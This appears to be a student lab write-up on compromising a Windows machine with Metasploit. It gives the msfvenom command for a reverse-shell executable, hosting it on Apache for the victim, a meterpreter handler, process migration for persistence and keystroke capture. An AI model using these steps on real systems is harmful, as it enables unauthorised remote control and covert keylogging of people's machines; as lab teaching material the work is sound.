# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="651" height="472" alt="1" src="https://github.com/user-attachments/assets/470db8f1-511f-476c-b0ee-528247714ab7" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="642" height="185" alt="2" src="https://github.com/user-attachments/assets/cfbbd121-b50f-47b9-8570-89acd15aa5fc" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="596" height="67" alt="4" src="https://github.com/user-attachments/assets/8088d4be-d78b-4437-b85d-90d742fd303b" />
<img width="596" height="67" alt="4" src="https://github.com/user-attachments/assets/6f9bf5d9-b4fc-4479-8d2e-07554df0006b" />
<img width="651" height="76" alt="3" src="https://github.com/user-attachments/assets/eacfc569-263c-4835-b0b0-6ff2d2a73825" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="596" height="67" alt="4" src="https://github.com/user-attachments/assets/b2364777-a1dd-4d95-8ee5-a736ee5cfb26" />


Check the status of apache2
## OUTPUT:

<img width="647" height="425" alt="5" src="https://github.com/user-attachments/assets/072b2413-3a04-4c46-8bdd-72d7e5dbfd45" />



Invoke msfconsole:
## OUTPUT:


<img width="642" height="532" alt="7" src="https://github.com/user-attachments/assets/64dbe328-87af-4f9d-89a4-7d3fc3304bc9" />
<img width="642" height="532" alt="7" src="https://github.com/user-attachments/assets/22e2b722-5312-42c2-a1bc-2301cfd55040" />
<img width="641" height="521" alt="6" src="https://github.com/user-attachments/assets/ba348a62-4371-46bc-897f-929088a5e4cb" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:


<img width="642" height="532" alt="7" src="https://github.com/user-attachments/assets/ee85e136-30fb-48f0-a19c-c959abdf698d" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:


<img width="656" height="275" alt="8" src="https://github.com/user-attachments/assets/df578da6-66d7-4ebc-9421-8380ec3721e3" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="937" height="766" alt="9" src="https://github.com/user-attachments/assets/bcecc8bc-c891-4e5c-904f-3c4be9ee37ce" />


On kali/parrot give the command exploit
## OUTPUT:


<img width="642" height="46" alt="10" src="https://github.com/user-attachments/assets/e1e09c69-63e7-4236-85f3-71239ec73f2e" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:


<img width="677" height="321" alt="11" src="https://github.com/user-attachments/assets/6bd4bacf-5dde-4e95-8e26-dbd4bf32ecbd" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="677" height="321" alt="11" src="https://github.com/user-attachments/assets/5e81d582-80c9-4865-9b74-acabca1bab0c" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="531" height="122" alt="13" src="https://github.com/user-attachments/assets/a21edcea-bf3b-4f0f-b92d-442159f3a05f" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
